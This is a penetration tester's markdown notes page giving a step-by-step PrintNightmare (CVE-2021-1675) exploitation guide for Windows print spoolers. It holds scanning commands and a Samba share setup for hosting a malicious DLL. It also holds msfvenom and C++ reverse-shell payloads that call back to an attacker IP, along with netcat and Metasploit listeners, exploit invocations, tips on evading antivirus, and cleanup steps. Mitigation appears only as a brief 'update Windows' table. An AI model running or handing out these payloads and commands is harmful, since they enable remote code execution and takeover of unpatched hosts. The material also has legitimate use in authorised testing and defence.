---
### The title for the content.
title: "printnightmare"
### If set, this will be used for the page's menu entry (instead of the `title` attribute)
# menuTitle : "printnightmare"
### The title of the page in menu will be prefixed by this HTML content
# pre : ""
### The title of the page in menu will be postfixed by this HTML content
# post : ""
### The description for the content.
description: "printnightmare, print all the shells."
### The datetime assigned to this page.
date: 2021-09-10T14:38:50+02:00
### Appears as the tail of the output URL. A value specified in front matter will override the segment of the URL based on the filename.
# slug : "printnightmare"
### Aliases can be used to create redirects to your page from other URLs.
# aliases : [""]
### Display name of this page modifier. If set, it will be displayed in the footer.
# LastModifierDisplayName : ""
### Email of this page modifier. If set with LastModifierDisplayName, it will be displayed in the footer
# LastModifierEmail : ""
### Table of content (toc) is enabled by default. Set this parameter to true to disable it.
# disableToc : true
### Set the page as a chapter, changing the way it's displayed
# chapter : true
### Hide a menu entry by setting this to true
# hidden : true
### If true, the content will not be rendered unless the --buildDrafts flag is passed to the hugo command.
# draft : true
### Used for ordering your content in lists. Lower weight gets higher precedence. So content with lower weight will come first.
### 0 does nothing !
weight: 0
### Used to tag content. By default this is inherited using cascading from _index.md files
### Only set of you want to overwrite these inherited values.
# tags : [""]
---

# Printnightmare

## Requirements

A user account. (privs don't mather)

## Scan

### RPC Dump

If you can reach these RPC interfaces you might be able to use printnightmare.

```bash
rpcdump.py @ip | egrep 'MS-RPRN|MS-PAR'
```

![rpcdump](images/rpcdump.png)

### It Was All A Dream

https://github.com/byt3bl33d3r/ItWasAllADream

```bash
git clone https://github.com/byt3bl33d3r/ItWasAllADream
cd ItWasAllADream && docker build -t itwasalladream .
docker run -it itwasalladream -u user -p password -d domain 192.168.1.0/24
docker cp <container-id>:/report_XXXXXXX ./
```

## Setup tool for remote RCE (cube0x0)

Ensure you have a impacket version that has [this PR](https://github.com/SecureAuthCorp/impacket/pull/1109) merged.

```bash
mkdir printnightmare
cd printnightmare
mkdir payloads
git clone https://github.com/justin-p/CVE-2021-1675
```

Then if you are lazy just use the [Taskfile](https://taskfile.dev/#/) included in the repo.

```bash
task payload_folder
task printnightmare_samba_share
```

To restore the smb.conf and stop the service run

```bash
task restore_samba
```

Otherwise use the steps below

### Host Dll

Make a backup of your smb.conf

```bash
sudo cp /etc/samba/smb.conf etc/samba/smb.conf.bak
```

Overwite the file with the following content

```bash
[global]
    map to guest = Bad User
    server role = standalone server
    usershare allow guests = yes
    idmap config * : backend = tdb
    smb ports = 445

[smb]
    comment = Samba
    path = /home/user/Documents/printnightmare/payloads/
    guest ok = yes
    read only = no
    browsable = yes
    force user = nobody
```

Ensure the files are owned by nobody

```bash
sudo chown nobody:user -R /home/user/Documents/printnightmare/payloads/
sudo chmod -R 777 /home/user/Documents/printnightmare/payloads/
```

Restart the smbd service

```bash
sudo service smbd restart
```

{{% notice warning %}}
Don't forget to restore the SMB config and disable the service :)
{{% /notice %}}

```bash
sudo cp /etc/samba/smb.conf etc/samba/smb.conf.bak
sudo service smbd stop
```

## Outflanks implementation

https://github.com/outflanknl/PrintNightmare

Did not test this yet. But seems 'better' then the cube0x0 implementation

## Create DLL

MSVenom if you think AV is not a problem. Otherwise build something custom.

### MSFVenom

```bash
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=<YOUR IP> LPORT=<PORT TO LISTEN> -f dll -o /home/user/Documents/printnightmare/payloads/rev.dll
```

### Custom simple C++ reverse shell example

1. Install C++ tools in visual studio.

2. Create new project with Dynamic-Link Libary template.

3. Download the `plain_revshell.cpp` file and paste the content into the existing template.

{{% attachments title="Related files" pattern="plain_revshell.cpp" %}}

4. Update the RHOST & RPORT on StartCallback

```cpp
BOOL WINAPI DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
	switch (dwReason) {
	case DLL_PROCESS_ATTACH:
		StartCallback("172.16.0.137", 80); // <- update this
```

5. Build the release (ctrl+shift+b)

6. Place the DLL in the payloads folder

## Usage

```bash
python3 [MSPAR|MSRPRN|MSRPRN_nobrute].py 'domain/user:pass@ip' PrinterName '\\IP_of_SMB_share\share\printer.dll'
```

There are 3 different version. All versions have been updated to support a custom driver/printername.

| Version        | Info                                                                                                                     | When to use                                                                                                             |
| -------------- | ------------------------------------------------------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------- |
| MSPAR          | Abuses MSPAR                                                                                                             | When ItWasAllADream says its vulnerable                                                                                 |
| MSRPRN         | Abuses MSRPRN                                                                                                            | When ItWasAllADream says its vulnerable                                                                                 |
| MSRPRN_nobrute | Abuses MSRPRN but does not brute force driver folders, see [this pull](https://github.com/cube0x0/CVE-2021-1675/pull/25) | When ItWasAllADream says its vulnerable but it does not seem to work and you tried everything listed in `Errors & tips` |

{{% notice warning %}}
Do note that MSRPRN_nobrute is more 'stealthy' (in the sense that there is less activity on disk) but less forgiving. Each run of the exploit needs a new printer name and dll name if they have not been removed.
{{% /notice %}}

### Errors & tips

| Error                                                                                                         | Solution                                                                                                                                                                                 |
| ------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied                                                         | permissions on the file in the SMB share                                                                                                                                                 |
| RPRN SessionError: unknown error code: 0x180                                                                  | Enable SMB2Support                                                                                                                                                                       |
| RPRN SessionError: code: 0x2: - ERROR_FILE_NOT_FOUND - The system cannot fil the file specified.              | Typo in supplied DLL ?                                                                                                                                                                   |
| RPRN SessionError: code: 0xd8 - ERROR_EXE_MACHINE_TYPE_MISMATCH                                               | DLL is kaduk or wrong architect (x86 vs x64)                                                                                                                                             |
| RPRN SessionError: code 0xe1 - ERROR_VIRUS_INFECTED                                                           | AV caught you butt, try harder                                                                                                                                                           |
| RPRN SessionError: Unknown error code: 0x8001011b                                                             | Seems like the host is patched                                                                                                                                                           |
| RPRN SessionError: code: 0x43 ERROR_BAD_NET_NAME                                                              | Wrong share name used in printnightmare or typo in samba config                                                                                                                          |
| SMB SessionError: STATUS_PIPE_BROKEN                                                                          | Print spooler service crashed during payload execution. Restart the spooler if you got a shell (PowerShell -> `Restart-Service spooler`. CMD -> `net stop spooler && net start spooler`) |
| After killing the session the payload does not work a second time                                             | Always ensure the first thing you do is restart the spooler service upon a shell connect. If you did this, use a different printername. Otherwise ur fuk'd                               |
| Sometimes when removing the print drivers the dll will execute again. This means your payload will run again. | Nothing, just something to be aware of if you use a payload that adds a user or w.e.                                                                                                     |

### Check if system reaches out

By simply trying to connect to a nc instance we can verify that the system can reach our smb server.

Start nc on 445.

```bash
sudo nv -nlvp 445
```

Run MSRPRN_nobrute and try to connect to nc.

```bash
python3 MSRPRN_nobrute.py 'user:pass@ip' PrinterName '\\IP_of_SMB_share\share\printer.dll'
```

![test_if_system_reaches_out](images/test_if_system_reaches_out.png)

### Exploit

{{% notice warning %}}
Depending on the dll you use/actions you preform the the spooler services can crashes/hangs. From my experience in these cases you wont be able to run printnightmare a second time if you did not restart the spooler service before hand. A way around this might be to follow the [Outflank advice](https://github.com/outflanknl/PrintNightmare) to use printnightmare to load a DLL that starts a second thread/process with a new DLL that contains the actual RCE/w.e. payload.
{{% /notice %}}

#### Setup a listener

##### Netcat

```bash
nc -nlvp 80
```

##### MSF multi handler

```bash
msfconsole -x "use exploit/multi/handler;\
set payload windows/shell_reverse_tcp;\
set LHOST 172.16.0.137;\
set LPORT 80;\
set ExitOnSession false;\
run -j"
```

#### Run printnightmare

```bash
python3 [MSPAR|MSRPRN|MSRPRN_nobrute].py  'domain/user:pass@ip' PrinterName '\\IP_of_SMB_share\share\printer.dll'
```

{{% notice warning %}}
From my experience the Spooler services sometimes crashes/hangs and you wont be able to run printnightmare a second time if you don't restart the spooler service. If you don't spawn a new process in the DLL ensure that the first thing you do is restart the spooler service.
{{% /notice %}}

```bash
net stop spooler && net start spooler
```

![](images/run_printnightmare.png)

### Cleanup

#### PowerShell

##### Load PrintManagement PS Module (should be loaded by default on W10)

```PowerShell
Import-Module PrintManagement
```

##### List current print drivers

```PowerShell
Get-PrinterDriver
```

##### Remove print drivers

```PowerShell
Get-PrinterDriver -Name PrinterName
```

##### Oneliner

Watch out, `Where-Object` uses Wildcards to get both drivers that get installed (`PrinterName0`, `PrinterName1`). Also, make sure to update the `dllname.dll` in the `Get-Item` action.

```PowerShell
Restart-Service Spooler;Import-Module PrintManagement;Get-PrinterDriver | Where-Object {$_.Name -like "*PrinterName*"} | Remove-PrinterDriver;Stop-Service spooler;Start-Sleep -s 2;Get-Item 'C:\windows\system32\spool\drivers\x64\3\New\','C:\windows\system32\spool\drivers\x64\3\Old\','C:\windows\system32\spool\drivers\x64\3\dllname.dll' -ErrorAction SilentlyContinue | Remove-Item;Start-Service spooler;Start-Sleep -s 2;Get-PrinterDriver
```

{{% notice info %}}
Error `HRESULT 0x800706be` on Remove-PrintDriver can happen. This is due the print spooler crashing.
{{% /notice %}}

### Mitigation

| Method     | Fix            |
| ---------- | -------------- |
| RCE MSRPRN | Update Windows |
| RCE MSPAR  | Update Windows |
| LPE        | Not tested yet |